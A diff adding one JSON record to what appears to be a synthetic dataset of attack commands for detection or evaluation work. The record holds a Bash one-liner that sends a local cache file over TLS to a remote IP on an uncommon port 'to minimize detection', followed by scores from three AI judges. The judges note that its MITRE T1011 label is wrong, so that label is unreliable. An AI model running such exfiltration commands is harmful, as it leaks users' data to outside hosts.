@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan2 >/dev/null 2>&1 && openssl s_client -quiet -connect 10.55.88.15:49573 -bind \"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\":0 < /home/user/.cache/map.dat",
+  "explanation": "Sends data over a TLS session explicitly bound to wlan2, using a non-standard port to minimize detection; this leverages a distinct wireless medium consistent with T1011.",
+  "rationale_steps": [
+    "Validate wlan2 as the alternate medium using iwconfig.",
+    "Bind the TLS client to wlan2\u2019s local IP to isolate the path from the primary channel.",
+    "Transmit the file over a high, uncommon port without altering system routes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-a13a4d10",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting, proper command substitution and redirections, and valid options; the ':0' after the quoted -bind argument is a separate token but not a syntax error.",
+        "semantic_score": 2,
+        "semantic_justification": "It plausibly exfiltrates data over a TLS connection bound to wlan2 on a non-standard port, but this is network exfiltration rather than using a physical medium as described for T1011, so the technique alignment is incorrect.",
+        "combined_score": 3.5,
+        "confidence": 0.82,
+        "timestamp": "2025-10-01T10:27:58.305229Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators (&&), valid flag formats, and correct use of command substitution.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does establish a network connection that could transfer data, it doesn't align with T1011 (Exfiltration Over Physical Medium) as it's using a wireless network connection rather than a physical removable device.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T10:28:01.302317Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid commands, flags, command substitutions, redirections, and logical operators for Bash on Linux.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command correctly performs network exfiltration via a specific wireless interface, this action fundamentally misaligns with the definition of MITRE ATT&CK T1011 'Exfiltration Over Physical Medium,' which involves transporting data on a physical storage device.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T10:28:20.057579Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
